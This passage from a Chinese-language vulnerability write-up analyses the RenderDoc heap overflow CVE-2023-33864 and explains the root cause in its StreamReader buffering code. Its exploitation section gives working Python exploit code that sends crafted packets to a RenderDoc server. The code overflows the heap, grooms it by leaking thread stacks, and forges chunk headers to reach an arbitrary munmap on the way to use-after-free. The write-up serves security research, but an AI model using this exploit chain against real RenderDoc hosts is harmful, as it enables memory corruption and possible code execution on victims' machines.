<p>这三个成员的关系如下：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_2_%E9%A1%B5.jpg" alt="renderdoc-第 2 页.jpg" /></p>

<p>数据保存到 m_BufferBase 的时候累加 m_InputSize 。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>       <span class="c1">// 阻塞式recv，确保全部读取了length个字节的数据</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5.jpg" alt="renderdoc-第 3 页.jpg" /></p>

<p>从 m_BufferBase 向用户缓冲区拷贝数据时，从 m_BufferHead 指向的位置开始读取，拷贝完成后更新 m_BufferHead 的位置。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
 <span class="p">{</span>
		<span class="p">......</span>
    <span class="c1">// perform the actual copy</span>
    <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">m_BufferHead</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>

    <span class="c1">// advance head</span>
    <span class="n">m_BufferHead</span> <span class="o">+=</span> <span class="n">numBytes</span><span class="p">;</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5%201.jpg" alt="renderdoc-第 3 页.jpg" /></p>

<p>若用户请求数据超过 10MB，网络数据直接写入StreamReader::Read第一个参数指定的用户缓冲区，而不经过 m_BufferBase 缓存。</p>

<p>ReadLargeBuffer 函数的作用是写入数据到用户缓冲区。</p>

<p>小于 10MB 的数据请求，数据先进入 m_BufferBase 缓存，再 memcpy 到用户缓冲区。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">......</span>

    <span class="k">if</span><span class="p">(</span><span class="n">m_File</span> <span class="o">||</span> <span class="n">m_Sock</span> <span class="o">||</span> <span class="n">m_Decompressor</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// 若用户请求的数据大于未读数据长度, 发起套接字读取</span>
      <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;</span> <span class="n">Available</span><span class="p">())</span>
      <span class="p">{</span>
        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">alreadyread</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
			<span class="c1">// 若用户请求数据超过 10MB, 网络数据直接写入用户缓冲区, 而不经过 m_BufferBase</span>
        <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="n">Available</span><span class="p">()</span> <span class="o">+</span> <span class="mi">128</span> <span class="o">&lt;</span> <span class="n">numBytes</span><span class="p">)</span>
        <span class="p">{</span>
      <span class="c1">// 网络数据直接写入用户缓冲区</span>
          <span class="n">success</span> <span class="o">=</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">numBytes</span><span class="p">);</span>
          <span class="n">alreadyread</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
      <span class="c1">// 若用户请求不超过 10MB, 网络数据先缓存到 m_BufferBase, 后面再拷贝到用户缓冲区</span>
          <span class="n">success</span> <span class="o">=</span> <span class="n">Reserve</span><span class="p">(</span><span class="n">numBytes</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>
          <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
        <span class="p">}</span>
			<span class="c1">// 若用户请求数据超过 10MB, 函数在这里返回</span>
        <span class="k">if</span><span class="p">(</span><span class="n">alreadyread</span><span class="p">)</span>
          <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
		<span class="c1">// 若用户请求不超过 10MB, 在这里发生拷贝</span>
    <span class="c1">// perform the actual copy</span>
    <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">m_BufferHead</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>

    <span class="c1">// advance head</span>
    <span class="n">m_BufferHead</span> <span class="o">+=</span> <span class="n">numBytes</span><span class="p">;</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
 <span class="p">}</span>

</code></pre></div></div>

<h3 id="超长-client-name-的处理">超长 client name 的处理</h3>

<p>握手包的 client name 保存在一个专门的堆缓冲区，我们暂且称之为 string buffer。string buffer 的长度由握手包的 client name length 字段指定。</p>

<p>若 client name 长度小于10MB，那么根据是否大于64KB来决定是否对 m_BufferBase 进行 resize。先从套接字读取 client name 到 m_BufferBase 缓冲区，再拷贝到 string buffer 里面。</p>

<p>若client name长度大于等于10MB， 那么直接从套接字读取数据到 string buffer。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc.jpg" alt="renderdoc.jpg" /></p>

<h2 id="漏洞产生的深层次原因">漏洞产生的深层次原因</h2>

<p><strong>这个漏洞产生的原因不是通常我们认为的“开发者忽略了什么”，而是设计模式的问题。</strong></p>

<p><strong>所以乍一看关于漏洞描述的每个字、每条逻辑都理解明白了，但总觉得哪里还是不对劲，却又说不出哪里不对劲来。</strong></p>

<p><strong>仔细分析一下就是对象接口的混用。</strong></p>

<p>我认为 ReadFromExternal 函数只能对 m_BufferBase 缓存进行写操作，因为ReadFromExternal 函数必须配合 StreamReader 对象的指示器来使用，这些都是围绕网络数据缓存设计的。</p>

<p>接收超长内容（≥10MB）调用的 ReadLargeBuffer 函数是直接对用户指定的缓冲区进行写数据。但是这个函数穿透到底层也是调用 ReadFromExternal 进行套接字的读写，导致了 StreamReader 对象的指示器发生了混乱。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg" alt="renderdoc-第 4 页.jpg" /></p>

<p>所以虽然表面上漏洞函数是 ReadFromExternal，该函数本身设计的并没有问题。</p>

<p>真正的问题是 StreamReade::ReadLargeBuffer 方法不应该调用 ReadFromExternal，而应该单独设计从套接字读取数据的逻辑来处理超长内容的接收。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">StreamReader</span>
<span class="p">{</span>
<span class="nl">public:</span>
	<span class="p">......</span>
	
<span class="nl">private:</span>
  <span class="p">......</span>
  <span class="kt">bool</span> <span class="n">Reserve</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">);</span>
  <span class="kt">bool</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">);</span>
  <span class="kt">bool</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">......</span>

<span class="p">};</span>
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="堆的控制能力">堆的控制能力</h2>

<h3 id="堆溢出能力">堆溢出能力</h3>

<p>在接收超长内容的时候，可以在两个地方溢出，一是在大于 10MB 的 string buffer，二是在 64KB 的 m_BufferBase。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">......</span>
  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>

    <span class="n">length</span> <span class="o">-=</span> <span class="n">directReadLength</span><span class="p">;</span>
    <span class="n">m_ReadOffset</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">**</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span> <span class="c1">// 第一处，对string buffer溢出**</span>

      <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>

      <span class="c1">// if we failed, return now</span>
      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">......</span>
  <span class="p">}</span>

  <span class="p">......</span>
  
  <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="c1">// read the 128 bytes</span>
  <span class="n">m_ReadOffset</span> <span class="o">+=</span> <span class="mi">128</span><span class="p">;</span>
  <span class="kt">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">**</span><span class="nf">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span> <span class="c1">// 第二处，对m_BufferBase溢出**</span>

  <span class="c1">// memcpy it where it's needed</span>
  <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>

  <span class="c1">// adjust read offset back for the 'fake' buffer we leave behind</span>
  <span class="n">m_ReadOffset</span> <span class="o">-=</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>为了精确控制溢出，不至于严重破坏堆的数据结构导致程序不能正常运行，我们不能在两个位置同时造成溢出。</p>

<p>我们可以通过控制 exp 的发送逻辑，仅对 m_BufferBase 进行堆溢出：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
<span class="c1"># 第一次 send，仅发送 16MB数据，虽然此时已经整数溢出，但确保了 string buffer 不发生溢出，
# 因为只发送了 16MB 数据，没有多余的可供 ReadFromExternal 第二轮接收
</span><span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
<span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
<span class="c1"># 第二次 send，此时已经发生了整数溢出，不仅满足 ReadFromExternal 第一轮接收 128字节，
# ReadFromExternal 函数第二轮接收直接导致了堆溢出
</span><span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="堆排布能力">堆排布能力</h3>

<ul>
  <li>任意长度堆块分配</li>
</ul>

<p>可以通过 callstack size 字段和 callstack 字段控制 server 分配任意长度的堆块保存 callstack：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ChunkCallstackFlag</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="c1"># 0x40，callstack部分的长度，长度单位是sizeof(unsigned long)
# b'\xff' * 0x200，callstack内容
</span><span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>

<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>堆块释放</li>
</ul>

<p>TargetControlServerThread 函数是 TCP 线程的主逻辑，它会检查连接进来的 client 是否符合建立调试线程的条件。</p>

<p>若不满足条件，则重新回到while循环的开始，继续监听套接字连接。这个过程会释放掉本轮产生m_BufferBase、string buffer、callstack。</p>

<h2 id="漏洞利用思路">漏洞利用思路</h2>

<p>利用堆溢出可以覆盖相邻堆块的 prev_size 字段和 size 字段，运用 <a href="http://tukan.farm/2016/07/27/munmap-madness/">House-of-Muney-Heap-Exploitation</a> 思路构造任意地址 munmap，把堆溢出转化成 UAF。</p>

<ol>
  <li>
    <p>当 librenderdoc.so 的 TCP 线程创建时，glibc 会 mmap 出一个64MB的空间作为线程的堆，堆区域到其他库文件的映射区域之间存在一片未使用的虚拟内存区域，这片未使用的内存区域被称为GAP。</p>

    <p>若 TCP 线程又创建其他线程，子线程的栈区域就从 libraries 边界开始，向低地址方向寻找未使用的内存区域进行开辟。首当其冲的就是 TCP 线程堆到 libraries 映射区域之间的 GAP 区域。</p>
  </li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_15.33.02.png" alt="截屏2025-05-27 15.33.02.png" /></p>

<ol>
  <li>
    <p>连续创建/退出 15个 client 调试线程，每个线程都会在当前进程的地址空间分配 8MB + 4KB 的栈空间。这么做的目的是通过内存泄漏把 GAP 消耗殆尽， 起到定位 victim stack 的作用，具体在第 4 步中介绍。</p>

    <p>能这么做的是因为程序在处理 client 主动退出的情况时，没有调用 pthread_join 回收栈空间，导致了内存泄漏。</p>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">root</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">thread stack leak </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>起一个新的连接，这个连接虽然不会起调试线程，但整个过程会分配并释放一个 64KB 的 m_BufferBase 缓存，和一个长度为0x130的 callstack 堆块。</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x26</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x01\x01\x01\x01\x01\x01\x01</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x26</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0xe</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ts588</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x02</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">54</span>
    
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.00.34.png" alt="截屏2025-05-27 20.00.34.png" /></p>

<ol>
  <li>对 m_BufferBase 缓存制造堆溢出，首先第一次 send 把 m_InputSize 变量变成0x400000</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
    
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
<span class="c1"># 0x90 是溢出边界
# 任意控制相邻堆块的 prev_size 字段和 size 字段
# packet = b'b' * 0x1000
# 0xfffffffffec12000 是 0x13EE000 的负数的补码
# glibc mmap的阈值是16MB
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
<span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>可以看到本轮在旧的callstack的后面分配了新的callstack，长度为0x210。旧的callstack被放到了tcache 里面。形成了如下的堆布局：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_5_%E9%A1%B5.jpg" alt="renderdoc-第 5 页.jpg" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.08.14.png" alt="截屏2025-05-27 20.08.14.png" /></p>

<p>第二次 send 调用，m_BufferBase 缓存发生堆溢出，其中：</p>

<p>old callstack 的 prev_size 和 size 字段保持不变；</p>

<p>new callstack 的 prev_size 字段覆盖为 0xfffffffffec12000，size 字段覆盖为 0x1bef007</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_6_%E9%A1%B5.jpg" alt="renderdoc-第 6 页.jpg" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.10.16.png" alt="截屏2025-05-27 20.10.16.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.15.46.png" alt="截屏2025-05-27 20.15.46.png" /></p>

<p>如此溢出是为了释放 new callstack 缓冲区的时候，绕过 munmap_chunk 的检查，实现任意地址、任意长度内存区域的 munmap。</p>

<p>中间之所以要夹一个释放状态的 old callstack，是因为在释放 new callstack 之前会先释放 m_BufferBase ，要通过相邻的 old callstack 来检查 m_BufferBase 是否被破坏。若中间不夹一个 old callstack 那么释放 m_BufferBase 的时候就会 panic。</p>

